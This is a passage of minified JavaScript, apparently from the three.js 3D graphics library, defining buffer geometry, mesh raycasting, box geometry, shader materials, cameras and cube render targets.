Jt(e){if(0===e.length)return-1/0;for(var t=e[0],n=1,r=e.length;n<r;++n)e[n]>t&&(t=e[n]);return t}var Zt=1,en=new $e,tn=new pt,nn=new he,rn=new me,an=new me,on=new he;function sn(){Object.defineProperty(this,"id",{value:Zt+=2}),this.uuid=J.generateUUID(),this.name="",this.type="BufferGeometry",this.index=null,this.attributes={},this.morphAttributes={},this.morphTargetsRelative=!1,this.groups=[],this.boundingBox=null,this.boundingSphere=null,this.drawRange={start:0,count:1/0},this.userData={}}sn.prototype=Object.assign(Object.create(K.prototype),{constructor:sn,isBufferGeometry:!0,getIndex:function(){return this.index},setIndex:function(e){return Array.isArray(e)?this.index=new(65535<Jt(e)?Kt:Gt)(e,1):this.index=e,this},getAttribute:function(e){return this.attributes[e]},setAttribute:function(e,t){return this.attributes[e]=t,this},deleteAttribute:function(e){return delete this.attributes[e],this},addGroup:function(e,t,n){this.groups.push({start:e,count:t,materialIndex:void 0!==n?n:0})},clearGroups:function(){this.groups=[]},setDrawRange:function(e,t){this.drawRange.start=e,this.drawRange.count=t},applyMatrix4:function(e){var t=this.attributes.position;void 0!==t&&(t.applyMatrix4(e),t.needsUpdate=!0);var n=this.attributes.normal;if(void 0!==n){var r=(new ae).getNormalMatrix(e);n.applyNormalMatrix(r),n.needsUpdate=!0}var i=this.attributes.tangent;return void 0!==i&&(i.transformDirection(e),i.needsUpdate=!0),null!==this.boundingBox&&this.computeBoundingBox(),null!==this.boundingSphere&&this.computeBoundingSphere(),this},rotateX:function(e){return en.makeRotationX(e),this.applyMatrix4(en),this},rotateY:function(e){return en.makeRotationY(e),this.applyMatrix4(en),this},rotateZ:function(e){return en.makeRotationZ(e),this.applyMatrix4(en),this},translate:function(e,t,n){return en.makeTranslation(e,t,n),this.applyMatrix4(en),this},scale:function(e,t,n){return en.makeScale(e,t,n),this.applyMatrix4(en),this},lookAt:function(e){return tn.lookAt(e),tn.updateMatrix(),this.applyMatrix4(tn.matrix),this},center:function(){return this.computeBoundingBox(),this.boundingBox.getCenter(nn).negate(),this.translate(nn.x,nn.y,nn.z),this},setFromObject:function(e){var t=e.geometry;if(e.isPoints||e.isLine){var n=new qt(3*t.vertices.length,3),r=new qt(3*t.colors.length,3);if(this.setAttribute("position",n.copyVector3sArray(t.vertices)),this.setAttribute("color",r.copyColorsArray(t.colors)),t.lineDistances&&t.lineDistances.length===t.vertices.length){var i=new qt(t.lineDistances.length,1);this.setAttribute("lineDistance",i.copyArray(t.lineDistances))}null!==t.boundingSphere&&(this.boundingSphere=t.boundingSphere.clone()),null!==t.boundingBox&&(this.boundingBox=t.boundingBox.clone())}else e.isMesh&&t&&t.isGeometry&&this.fromGeometry(t);return this},setFromPoints:function(e){for(var t=[],n=0,r=e.length;n<r;n++){var i=e[n];t.push(i.x,i.y,i.z||0)}return this.setAttribute("position",new qt(t,3)),this},updateFromObject:function(e){var t=e.geometry;if(e.isMesh){var n=t.__directGeometry;if(!0===t.elementsNeedUpdate&&(n=void 0,t.elementsNeedUpdate=!1),void 0===n)return this.fromGeometry(t);n.verticesNeedUpdate=t.verticesNeedUpdate,n.normalsNeedUpdate=t.normalsNeedUpdate,n.colorsNeedUpdate=t.colorsNeedUpdate,n.uvsNeedUpdate=t.uvsNeedUpdate,n.groupsNeedUpdate=t.groupsNeedUpdate,t.verticesNeedUpdate=!1,t.normalsNeedUpdate=!1,t.colorsNeedUpdate=!1,t.uvsNeedUpdate=!1,t.groupsNeedUpdate=!1,t=n}if(!0===t.verticesNeedUpdate){var r=this.attributes.position;void 0!==r&&(r.copyVector3sArray(t.vertices),r.needsUpdate=!0),t.verticesNeedUpdate=!1}if(!0===t.normalsNeedUpdate){var i=this.attributes.normal;void 0!==i&&(i.copyVector3sArray(t.normals),i.needsUpdate=!0),t.normalsNeedUpdate=!1}if(!0===t.colorsNeedUpdate){var a=this.attributes.color;void 0!==a&&(a.copyColorsArray(t.colors),a.needsUpdate=!0),t.colorsNeedUpdate=!1}if(t.uvsNeedUpdate){var o=this.attributes.uv;void 0!==o&&(o.copyVector2sArray(t.uvs),o.needsUpdate=!0),t.uvsNeedUpdate=!1}if(t.lineDistancesNeedUpdate){var s=this.attributes.lineDistance;void 0!==s&&(s.copyArray(t.lineDistances),s.needsUpdate=!0),t.lineDistancesNeedUpdate=!1}return t.groupsNeedUpdate&&(t.computeGroups(e.geometry),this.groups=t.groups,t.groupsNeedUpdate=!1),this},fromGeometry:function(e){return e.__directGeometry=(new Yt).fromGeometry(e),this.fromDirectGeometry(e.__directGeometry)},fromDirectGeometry:function(e){var t=new Float32Array(3*e.vertices.length);if(this.setAttribute("position",new $t(t,3).copyVector3sArray(e.vertices)),0<e.normals.length){var n=new Float32Array(3*e.normals.length);this.setAttribute("normal",new $t(n,3).copyVector3sArray(e.normals))}if(0<e.colors.length){var r=new Float32Array(3*e.colors.length);this.setAttribute("color",new $t(r,3).copyColorsArray(e.colors))}if(0<e.uvs.length){var i=new Float32Array(2*e.uvs.length);this.setAttribute("uv",new $t(i,2).copyVector2sArray(e.uvs))}if(0<e.uvs2.length){var a=new Float32Array(2*e.uvs2.length);this.setAttribute("uv2",new $t(a,2).copyVector2sArray(e.uvs2))}for(var o in this.groups=e.groups,e.morphTargets){for(var s=[],l=e.morphTargets[o],c=0,u=l.length;c<u;c++){var d=l[c],p=new qt(3*d.data.length,3);p.name=d.name,s.push(p.copyVector3sArray(d.data))}this.morphAttributes[o]=s}if(0<e.skinIndices.length){var h=new qt(4*e.skinIndices.length,4);this.setAttribute("skinIndex",h.copyVector4sArray(e.skinIndices))}if(0<e.skinWeights.length){var f=new qt(4*e.skinWeights.length,4);this.setAttribute("skinWeight",f.copyVector4sArray(e.skinWeights))}return null!==e.boundingSphere&&(this.boundingSphere=e.boundingSphere.clone()),null!==e.boundingBox&&(this.boundingBox=e.boundingBox.clone()),this},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new me);var e=this.attributes.position,t=this.morphAttributes.position;if(e&&e.isGLBufferAttribute)this.boundingBox.set(new he(-1/0,-1/0,-1/0),new he(1/0,1/0,1/0));else{if(void 0!==e){if(this.boundingBox.setFromBufferAttribute(e),t)for(var n=0,r=t.length;n<r;n++){var i=t[n];rn.setFromBufferAttribute(i),this.morphTargetsRelative?(on.addVectors(this.boundingBox.min,rn.min),this.boundingBox.expandByPoint(on),on.addVectors(this.boundingBox.max,rn.max),this.boundingBox.expandByPoint(on)):(this.boundingBox.expandByPoint(rn.min),this.boundingBox.expandByPoint(rn.max))}}else this.boundingBox.makeEmpty();isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z)}},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new Ie);var e=this.attributes.position,t=this.morphAttributes.position;if(e&&e.isGLBufferAttribute)this.boundingSphere.set(new he,1/0);else if(e){var n=this.boundingSphere.center;if(rn.setFromBufferAttribute(e),t)for(var r=0,i=t.length;r<i;r++){var a=t[r];an.setFromBufferAttribute(a),this.morphTargetsRelative?(on.addVectors(rn.min,an.min),rn.expandByPoint(on),on.addVectors(rn.max,an.max),rn.expandByPoint(on)):(rn.expandByPoint(an.min),rn.expandByPoint(an.max))}rn.getCenter(n);for(var o=0,s=0,l=e.count;s<l;s++)on.fromBufferAttribute(e,s),o=Math.max(o,n.distanceToSquared(on));if(t)for(var c=0,u=t.length;c<u;c++)for(var d=t[c],p=this.morphTargetsRelative,h=0,f=d.count;h<f;h++)on.fromBufferAttribute(d,h),p&&(nn.fromBufferAttribute(e,h),on.add(nn)),o=Math.max(o,n.distanceToSquared(on));this.boundingSphere.radius=Math.sqrt(o),isNaN(this.boundingSphere.radius)}},computeFaceNormals:function(){},computeVertexNormals:function(){var e=this.index,t=this.getAttribute("position");if(void 0!==t){var n=this.getAttribute("normal");if(void 0===n)n=new $t(new Float32Array(3*t.count),3),this.setAttribute("normal",n);else for(var r=0,i=n.count;r<i;r++)n.setXYZ(r,0,0,0);var a=new he,o=new he,s=new he,l=new he,c=new he,u=new he,d=new he,p=new he;if(e)for(var h=0,f=e.count;h<f;h+=3){var A=e.getX(h+0),m=e.getX(h+1),v=e.getX(h+2);a.fromBufferAttribute(t,A),o.fromBufferAttribute(t,m),s.fromBufferAttribute(t,v),d.subVectors(s,o),p.subVectors(a,o),d.cross(p),l.fromBufferAttribute(n,A),c.fromBufferAttribute(n,m),u.fromBufferAttribute(n,v),l.add(d),c.add(d),u.add(d),n.setXYZ(A,l.x,l.y,l.z),n.setXYZ(m,c.x,c.y,c.z),n.setXYZ(v,u.x,u.y,u.z)}else for(var g=0,y=t.count;g<y;g+=3)a.fromBufferAttribute(t,g+0),o.fromBufferAttribute(t,g+1),s.fromBufferAttribute(t,g+2),d.subVectors(s,o),p.subVectors(a,o),d.cross(p),n.setXYZ(g+0,d.x,d.y,d.z),n.setXYZ(g+1,d.x,d.y,d.z),n.setXYZ(g+2,d.x,d.y,d.z);this.normalizeNormals(),n.needsUpdate=!0}},merge:function(e,t){if(e&&e.isBufferGeometry){void 0===t&&(t=0);var n=this.attributes;for(var r in n)if(void 0!==e.attributes[r])for(var i=n[r].array,a=e.attributes[r],o=a.array,s=a.itemSize*t,l=Math.min(o.length,i.length-s),c=0,u=s;c<l;c++,u++)i[u]=o[c];return this}},normalizeNormals:function(){for(var e=this.attributes.normal,t=0,n=e.count;t<n;t++)on.fromBufferAttribute(e,t),on.normalize(),e.setXYZ(t,on.x,on.y,on.z)},toNonIndexed:function(){function e(e,t){for(var n=e.array,r=e.itemSize,i=e.normalized,a=new n.constructor(t.length*r),o=0,s=0,l=0,c=t.length;l<c;l++){o=t[l]*r;for(var u=0;u<r;u++)a[s++]=n[o++]}return new $t(a,r,i)}if(null===this.index)return this;var t=new sn,n=this.index.array,r=this.attributes;for(var i in r){var a=e(r[i],n);t.setAttribute(i,a)}var o=this.morphAttributes;for(var s in o){for(var l=[],c=o[s],u=0,d=c.length;u<d;u++){var p=e(c[u],n);l.push(p)}t.morphAttributes[s]=l}t.morphTargetsRelative=this.morphTargetsRelative;for(var h=this.groups,f=0,A=h.length;f<A;f++){var m=h[f];t.addGroup(m.start,m.count,m.materialIndex)}return t},toJSON:function(){var e={metadata:{version:4.5,type:"BufferGeometry",generator:"BufferGeometry.toJSON"}};if(e.uuid=this.uuid,e.type=this.type,""!==this.name&&(e.name=this.name),0<Object.keys(this.userData).length&&(e.userData=this.userData),void 0!==this.parameters){var t=this.parameters;for(var n in t)void 0!==t[n]&&(e[n]=t[n]);return e}e.data={attributes:{}};var r=this.index;null!==r&&(e.data.index={type:r.array.constructor.name,array:Array.prototype.slice.call(r.array)});var i=this.attributes;for(var a in i){var o=i[a],s=o.toJSON(e.data);""!==o.name&&(s.name=o.name),e.data.attributes[a]=s}var l={},c=!1;for(var u in this.morphAttributes){for(var d=this.morphAttributes[u],p=[],h=0,f=d.length;h<f;h++){var A=d[h],m=A.toJSON(e.data);""!==A.name&&(m.name=A.name),p.push(m)}0<p.length&&(l[u]=p,c=!0)}c&&(e.data.morphAttributes=l,e.data.morphTargetsRelative=this.morphTargetsRelative);var v=this.groups;0<v.length&&(e.data.groups=JSON.parse(JSON.stringify(v)));var g=this.boundingSphere;return null!==g&&(e.data.boundingSphere={center:g.center.toArray(),radius:g.radius}),e},clone:function(){return(new sn).copy(this)},copy:function(e){this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null;var t={};this.name=e.name;var n=e.index;null!==n&&this.setIndex(n.clone(t));var r=e.attributes;for(var i in r){var a=r[i];this.setAttribute(i,a.clone(t))}var o=e.morphAttributes;for(var s in o){for(var l=[],c=o[s],u=0,d=c.length;u<d;u++)l.push(c[u].clone(t));this.morphAttributes[s]=l}this.morphTargetsRelative=e.morphTargetsRelative;for(var p=e.groups,h=0,f=p.length;h<f;h++){var A=p[h];this.addGroup(A.start,A.count,A.materialIndex)}var m=e.boundingBox;null!==m&&(this.boundingBox=m.clone());var v=e.boundingSphere;return null!==v&&(this.boundingSphere=v.clone()),this.drawRange.start=e.drawRange.start,this.drawRange.count=e.drawRange.count,this.userData=e.userData,this},dispose:function(){this.dispatchEvent({type:"dispose"})}});var ln=new $e,cn=new Ue,un=new Ie,dn=new he,pn=new he,hn=new he,fn=new he,An=new he,mn=new he,vn=new he,gn=new he,yn=new he,bn=new ie,_n=new ie,wn=new ie,Cn=new he,xn=new he;function Sn(e,t){pt.call(this),this.type="Mesh",this.geometry=void 0!==e?e:new sn,this.material=void 0!==t?t:new Rt,this.updateMorphTargets()}function kn(e,t,n,r,i,a,o,s){if(null===(1===t.side?r.intersectTriangle(o,a,i,!0,s):r.intersectTriangle(i,a,o,2!==t.side,s)))return null;xn.copy(s),xn.applyMatrix4(e.matrixWorld);var l=n.ray.origin.distanceTo(xn);return l<n.near||l>n.far?null:{distance:l,point:xn.clone(),object:e}}function Mn(e,t,n,r,i,a,o,s,l,c,u,d){dn.fromBufferAttribute(i,c),pn.fromBufferAttribute(i,u),hn.fromBufferAttribute(i,d);var p=e.morphTargetInfluences;if(t.morphTargets&&a&&p){vn.set(0,0,0),gn.set(0,0,0),yn.set(0,0,0);for(var h=0,f=a.length;h<f;h++){var A=p[h],m=a[h];0!==A&&(fn.fromBufferAttribute(m,c),An.fromBufferAttribute(m,u),mn.fromBufferAttribute(m,d),o?(vn.addScaledVector(fn,A),gn.addScaledVector(An,A),yn.addScaledVector(mn,A)):(vn.addScaledVector(fn.sub(dn),A),gn.addScaledVector(An.sub(pn),A),yn.addScaledVector(mn.sub(hn),A)))}dn.add(vn),pn.add(gn),hn.add(yn)}e.isSkinnedMesh&&(e.boneTransform(c,dn),e.boneTransform(u,pn),e.boneTransform(d,hn));var v=kn(e,t,n,r,dn,pn,hn,Cn);if(v){s&&(bn.fromBufferAttribute(s,c),_n.fromBufferAttribute(s,u),wn.fromBufferAttribute(s,d),v.uv=Mt.getUV(Cn,dn,pn,hn,bn,_n,wn,new ie)),l&&(bn.fromBufferAttribute(l,c),_n.fromBufferAttribute(l,u),wn.fromBufferAttribute(l,d),v.uv2=Mt.getUV(Cn,dn,pn,hn,bn,_n,wn,new ie));var g=new Ot(c,u,d);Mt.getNormal(dn,pn,hn,g.normal),v.face=g}return v}Sn.prototype=Object.assign(Object.create(pt.prototype),{constructor:Sn,isMesh:!0,copy:function(e){return pt.prototype.copy.call(this,e),void 0!==e.morphTargetInfluences&&(this.morphTargetInfluences=e.morphTargetInfluences.slice()),void 0!==e.morphTargetDictionary&&(this.morphTargetDictionary=Object.assign({},e.morphTargetDictionary)),this.material=e.material,this.geometry=e.geometry,this},updateMorphTargets:function(){var e=this.geometry;if(e.isBufferGeometry){var t=e.morphAttributes,n=Object.keys(t);if(0<n.length){var r=t[n[0]];if(void 0!==r){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(var i=0,a=r.length;i<a;i++){var o=r[i].name||String(i);this.morphTargetInfluences.push(0),this.morphTargetDictionary[o]=i}}}}else{var s=e.morphTargets;void 0!==s&&s.length}},raycast:function(e,t){var n,r=this.geometry,i=this.material,a=this.matrixWorld;if(void 0!==i&&(null===r.boundingSphere&&r.computeBoundingSphere(),un.copy(r.boundingSphere),un.applyMatrix4(a),!1!==e.ray.intersectsSphere(un)&&(ln.getInverse(a),cn.copy(e.ray).applyMatrix4(ln),null===r.boundingBox||!1!==cn.intersectsBox(r.boundingBox))))if(r.isBufferGeometry){var o=r.index,s=r.attributes.position,l=r.morphAttributes.position,c=r.morphTargetsRelative,u=r.attributes.uv,d=r.attributes.uv2,p=r.groups,h=r.drawRange;if(null!==o)if(Array.isArray(i))for(var f=0,A=p.length;f<A;f++)for(var m=p[f],v=i[m.materialIndex],g=Math.max(m.start,h.start),y=Math.min(m.start+m.count,h.start+h.count);g<y;g+=3){var b=o.getX(g),_=o.getX(g+1),w=o.getX(g+2);(n=Mn(this,v,e,cn,s,l,c,u,d,b,_,w))&&(n.faceIndex=Math.floor(g/3),n.face.materialIndex=m.materialIndex,t.push(n))}else for(var C=Math.max(0,h.start),x=Math.min(o.count,h.start+h.count);C<x;C+=3){var S=o.getX(C),k=o.getX(C+1),M=o.getX(C+2);(n=Mn(this,i,e,cn,s,l,c,u,d,S,k,M))&&(n.faceIndex=Math.floor(C/3),t.push(n))}else if(void 0!==s)if(Array.isArray(i))for(var B=0,E=p.length;B<E;B++)for(var T=p[B],P=i[T.materialIndex],I=Math.max(T.start,h.start),F=Math.min(T.start+T.count,h.start+h.count);I<F;I+=3)(n=Mn(this,P,e,cn,s,l,c,u,d,I,I+1,I+2))&&(n.faceIndex=Math.floor(I/3),n.face.materialIndex=T.materialIndex,t.push(n));else for(var L=Math.max(0,h.start),O=Math.min(s.count,h.start+h.count);L<O;L+=3)(n=Mn(this,i,e,cn,s,l,c,u,d,L,L+1,L+2))&&(n.faceIndex=Math.floor(L/3),t.push(n))}else if(r.isGeometry){var N,D=Array.isArray(i),R=r.vertices,j=r.faces,U=r.faceVertexUvs[0];0<U.length&&(N=U);for(var $=0,z=j.length;$<z;$++){var H=j[$],V=D?i[H.materialIndex]:i;if(void 0!==V){var Q=R[H.a],G=R[H.b],W=R[H.c];if(n=kn(this,V,e,cn,Q,G,W,Cn)){if(N&&N[$]){var K=N[$];bn.copy(K[0]),_n.copy(K[1]),wn.copy(K[2]),n.uv=Mt.getUV(Cn,Q,G,W,bn,_n,wn,new ie)}n.face=H,n.faceIndex=$,t.push(n)}}}}}});var Bn=function(e){function t(t,n,r,i,a,o){var s;void 0===t&&(t=1),void 0===n&&(n=1),void 0===r&&(r=1),void 0===i&&(i=1),void 0===a&&(a=1),void 0===o&&(o=1),(s=e.call(this)||this).type="BoxBufferGeometry",s.parameters={width:t,height:n,depth:r,widthSegments:i,heightSegments:a,depthSegments:o};var l=ne(s);i=Math.floor(i),a=Math.floor(a),o=Math.floor(o);var c=[],u=[],d=[],p=[],h=0,f=0;function A(e,t,n,r,i,a,o,s,A,m,v){for(var g=a/A,y=o/m,b=a/2,_=o/2,w=s/2,C=A+1,x=m+1,S=0,k=0,M=new he,B=0;B<x;B++)for(var E=B*y-_,T=0;T<C;T++){var P=T*g-b;M[e]=P*r,M[t]=E*i,M[n]=w,u.push(M.x,M.y,M.z),M[e]=0,M[t]=0,M[n]=0<s?1:-1,d.push(M.x,M.y,M.z),p.push(T/A),p.push(1-B/m),S+=1}for(var I=0;I<m;I++)for(var F=0;F<A;F++){var L=h+F+C*I,O=h+F+C*(I+1),N=h+(F+1)+C*(I+1),D=h+(F+1)+C*I;c.push(L,O,D),c.push(O,N,D),k+=6}l.addGroup(f,k,v),f+=k,h+=S}return A("z","y","x",-1,-1,r,n,t,o,a,0),A("z","y","x",1,-1,r,n,-t,o,a,1),A("x","z","y",1,1,t,r,n,i,o,2),A("x","z","y",1,-1,t,r,-n,i,o,3),A("x","y","z",1,-1,t,n,r,i,a,4),A("x","y","z",-1,-1,t,n,-r,i,a,5),s.setIndex(c),s.setAttribute("position",new qt(u,3)),s.setAttribute("normal",new qt(d,3)),s.setAttribute("uv",new qt(p,2)),s}return te(t,e),t}(sn);function En(e){var t={};for(var n in e)for(var r in t[n]={},e[n]){var i=e[n][r];i&&(i.isColor||i.isMatrix3||i.isMatrix4||i.isVector2||i.isVector3||i.isVector4||i.isTexture)?t[n][r]=i.clone():Array.isArray(i)?t[n][r]=i.slice():t[n][r]=i}return t}function Tn(e){for(var t={},n=0;n<e.length;n++){var r=En(e[n]);for(var i in r)t[i]=r[i]}return t}var Pn={clone:En,merge:Tn};function In(e){Dt.call(this),this.type="ShaderMaterial",this.defines={},this.uniforms={},this.vertexShader="void main() {\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\n}",this.fragmentShader="void main() {\n\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\n}",this.linewidth=1,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.clipping=!1,this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.extensions={derivatives:!1,fragDepth:!1,drawBuffers:!1,shaderTextureLOD:!1},this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv2:[0,0]},this.index0AttributeName=void 0,this.uniformsNeedUpdate=!1,this.glslVersion=null,void 0!==e&&(e.attributes,this.setValues(e))}function Fn(){pt.call(this),this.type="Camera",this.matrixWorldInverse=new $e,this.projectionMatrix=new $e,this.projectionMatrixInverse=new $e}function Ln(e,t,n,r){Fn.call(this),this.type="PerspectiveCamera",this.fov=void 0!==e?e:50,this.zoom=1,this.near=void 0!==n?n:.1,this.far=void 0!==r?r:2e3,this.focus=10,this.aspect=void 0!==t?t:1,this.view=null,this.filmGauge=35,this.filmOffset=0,this.updateProjectionMatrix()}function On(e,t,n){if(pt.call(this),this.type="CubeCamera",!0===n.isWebGLCubeRenderTarget){this.renderTarget=n;var r=new Ln(90,1,e,t);r.layers=this.layers,r.up.set(0,-1,0),r.lookAt(new he(1,0,0)),this.add(r);var i=new Ln(90,1,e,t);i.layers=this.layers,i.up.set(0,-1,0),i.lookAt(new he(-1,0,0)),this.add(i);var a=new Ln(90,1,e,t);a.layers=this.layers,a.up.set(0,0,1),a.lookAt(new he(0,1,0)),this.add(a);var o=new Ln(90,1,e,t);o.layers=this.layers,o.up.set(0,0,-1),o.lookAt(new he(0,-1,0)),this.add(o);var s=new Ln(90,1,e,t);s.layers=this.layers,s.up.set(0,-1,0),s.lookAt(new he(0,0,1)),this.add(s);var l=new Ln(90,1,e,t);l.layers=this.layers,l.up.set(0,-1,0),l.lookAt(new he(0,0,-1)),this.add(l),this.update=function(e,t){null===this.parent&&this.updateMatrixWorld();var c=e.xr.enabled,u=e.getRenderTarget();e.xr.enabled=!1;var d=n.texture.generateMipmaps;n.texture.generateMipmaps=!1,e.setRenderTarget(n,0),e.render(t,r),e.setRenderTarget(n,1),e.render(t,i),e.setRenderTarget(n,2),e.render(t,a),e.setRenderTarget(n,3),e.render(t,o),e.setRenderTarget(n,4),e.render(t,s),n.texture.generateMipmaps=d,e.setRenderTarget(n,5),e.render(t,l),e.setRenderTarget(u),e.xr.enabled=c}}}function Nn(e,t,r,i,a,o,s,l,c,u){le.call(this,e=void 0!==e?e:[],t=void 0!==t?t:n,r,i,a,o,s=void 0!==s?s:C,l,c,u),this.flipY=!1,this._needsFlipEnvMap=!0}function Dn(e,t,n){Number.isInteger(t)&&(t=n),ue.call(this,e,e,t),t=t||{},this.texture=new Nn(void 0,t.mapping,t.wrapS,t.wrapT,t.magFilter,t.minFilter,t.format,t.type,t.anisotropy,t.encoding),this.texture._needsFlipEnvMap=!1}function Rn(e,t,n,r,i,a,o,s,l,c,u,p){le.call(this,null,a,o,s,l,c,r,i,u,p),this.image={data:e||null,width:t||1,height:n||1},this.magFilter=void 0!==l?l:d,this.minFilter=void 0!==c?c:d,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1,this.needsUpdate=!0}((In.prototype=Object.create(Dt.prototype)).constructor=In).prototype.isShaderMaterial=!0,In.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.fragmentShader=e.fragmentShader,this.vertexShader=e.vertexShader,this.uniforms=En(e.uniforms),this.defines=Object.assign({},e.defines),this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.lights=e.lights,this.clipping=e.clipping,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this.extensions=Object.assign({},e.extensions),this.glslVersion=e.glslVersion,this},In.prototype.toJSON=function(e){var t=Dt.prototype.toJSON.call(this,e);for(var n in t.glslVersion=this.glslVersion,t.uniforms={},this.uniforms){var r=this.uniforms[n].value;r&&r.isTexture?t.uniforms[n]={type:"t",value:r.toJSON(e).uuid}:r&&r.isColor?t.uniforms[n]={type:"c",value:r.getHex()}:r&&r.isVector2?t.uniforms[n]={type:"v2",value:r.toArray()}:r&&r.isVector3?t.uniforms[n]={type:"v3",value:r.toArray()}:r&&r.isVector4?t.uniforms[n]={type:"v4",value:r.toArray()}:r&&r.isMatrix3?t.uniforms[n]={type:"m3",value:r.toArray()}:r&&r.isMatrix4?t.uniforms[n]={type:"m4",value:r.toArray()}:t.uniforms[n]={value:r}}0<Object.keys(this.defines).length&&(t.defines=this.defines),t.vertexShader=this.vertexShader,t.fragmentShader=this.fragmentShader;var i={};for(var a in this.extensions)!0===this.extensions[a]&&(i[a]=!0);return 0<Object.keys(i).length&&(t.extensions=i),t},Fn.prototype=Object.assign(Object.create(pt.prototype),{constructor:Fn,isCamera:!0,copy:function(e,t){return pt.prototype.copy.call(this,e,t),this.matrixWorldInverse.copy(e.matrixWorldInverse),this.projectionMatrix.copy(e.projectionMatrix),this.projectionMatrixInverse.copy(e.projectionMatrixInverse),this},getWorldDirection:function(e){void 0===e&&(e=new he),this.updateWorldMatrix(!0,!1);var t=this.matrixWorld.elements;return e.set(-t[8],-t[9],-t[10]).normalize()},updateMatrixWorld:function(e){pt.prototype.updateMatrixWorld.call(this,e),this.matrixWorldInverse.getInverse(this.matrixWorld)},updateWorldMatrix:function(e,t){pt.prototype.updateWorldMatrix.call(this,e,t),this.matrixWorldInverse.getInverse(this.matrixWorld)},clone:function(){return(new this.constructor).copy(this)}}),Ln.prototype=Object.assign(Object.create(Fn.prototype),{constructor:Ln,isPerspectiveCamera:!0,copy:function(e,t){return Fn.prototype.copy.call(this,e,t),this.fov=e.fov,this.zoom=e.zoom,this.near=e.near,this.far=e.far,this.focus=e.focus,this.aspect=e.aspect,this.view=null===e.view?null:Object.assign({},e.view),this.filmGauge=e.filmGauge,this.filmOffset=e.filmOffset,this},setFocalLength:function(e){var t=.5*this.getFilmHeight()/e;this.fov=2*J.RAD2DEG*Math.atan(t),this.updateProjectionMatrix()},getFocalLength:function(){var e=Math.tan(.5*J.DEG2RAD*this.fov);return.5*this.getFilmHeight()/e},getEffectiveFOV:function(){return 2*J.RAD2DEG*Math.atan(Math.tan(.5*J.DEG2RAD*this.fov)/this.zoom)},getFilmWidth:function(){return this.filmGauge*Math.min(this.aspect,1)},getFilmHeight:function(){return this.filmGauge/Math.max(this.aspect,1)},setViewOffset:function(e,t,n,r,i,a){this.aspect=e/t,null===this.view&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=t,this.view.offsetX=n,this.view.offsetY=r,this.view.width=i,this.view.height=a,this.updateProjectionMatrix()},clearViewOffset:function(){null!==this.view&&(this.view.enabled=!1),this.updateProjectionMatrix()},updateProjectionMatrix:function(){var e=this.near,t=e*Math.tan(.5*J.DEG2RAD*this.fov)/this.zoom,n=2*t,r=this.aspect*n,i=-.5*r,a=this.view;if(null!==this.view&&this.view.enabled){var o=a.fullWidth,s=a.fullHeight;i+=a.offsetX*r/o,t-=a.offsetY*n/s,r*=a.width/o,n*=a.height/s}var l=this.filmOffset;0!==l&&(i+=e*l/this.getFilmWidth()),this.projectionMatrix.makePerspective(i,i+r,t,t-n,e,this.far),this.projectionMatrixInverse.getInverse(this.projectionMatrix)},toJSON:function(e){var t=pt.prototype.toJSON.call(this,e);return t.object.fov=this.fov,t.object.zoom=this.zoom,t.object.near=this.near,t.object.far=this.far,t.object.focus=this.focus,t.object.aspect=this.aspect,null!==this.view&&(t.object.view=Object.assign({},this.view)),t.object.filmGauge=this.filmGauge,t.object.filmOffset=this.filmOffset,t}}),(On.prototype=Object.create(pt.prototype)).constructor=On,((Nn.prototype=Object.create(le.prototype)).constructor=Nn).prototype.isCubeTexture=!0,Object.defineProperty(Nn.prototype,"images",{get:function(){return this.image},set:function(e){this.image=e}}),((Dn.prototype=Object.create(ue.prototype)).constructor=Dn).prototype.isWebGLCubeRenderTarget=!0,Dn.prototype.fromEquirectangularTexture=function(e,t){this.texture.type=t.type,this.texture.format=x,this.texture.encoding=t.encoding,this.texture.generateMipmaps=t.generateMipmaps,this.texture.minFilter=t.minFilter,this.texture.magFilter=t.magFilter;var n=new Bn(5,5,5),r=new In({name:"CubemapFromEquirect",uniforms:En({tEquirect:{value:null}}),vertexShader:"\n\n\t\t\tvarying vec3 vWorldDirection;\n\n\t\t\tvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\n\n\t\t\t\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\n\n\t\t\t}\n\n\t\t\tvoid main() {\n\n\t\t\t\tvWorldDirection = transformDirection( position, modelMatrix );\n\n\t\t\t\t#include <begin_vertex>\n\t\t\t\t#include <project_vertex>\n\n\t\t\t}\n\t\t",fragmentShader:"\n\n\t\t\tuniform sampler2D tEquirect;\n\n\t\t\tvarying vec3 vWorldDirection;\n\n\t\t\t#include <common>\n\n\t\t\tvoid main() {\n\n\t\t\t\tvec3 direction = normalize( vWorldDirection );\n\n\t\t\t\tvec2 sampleUV = equirectUv( direction );\n\n\t\t\t\tgl_FragColor = texture2D( tEquirect, sampleUV );\n\n\t\t\t}\n\t\t",side:1,blending:0});r.uniforms.tEquirect.value=t;var i=new Sn(n,r),a=t.minFilter;return t.minFilter===m&&(t.minFilter=f),new On(1,10,this).update(e,i),t.minFilter=a,i.geometry.dispose(),i.material.dispose(),this},Dn.prototype.clear=function(e,t,n,r){for(var i=e.getRenderTarget(),a=0;a<6;a++)e.setRenderTarget(this,a),e.clear(t,n,r);e.setRenderTarget(i)},((Rn.prototype=Object.create(le.prototype)).constructor=Rn).prototype.isDataTexture=!0;var jn=new Ie,Un=new he,$n=function(){function e(e,t,n,r,i,a){this.planes=[void 0!==e?e:new mt,void 0!==t?t:new mt,void 0!==n?n:new mt,void 0!==r?r:new mt,void 0!==i?i:new mt,void 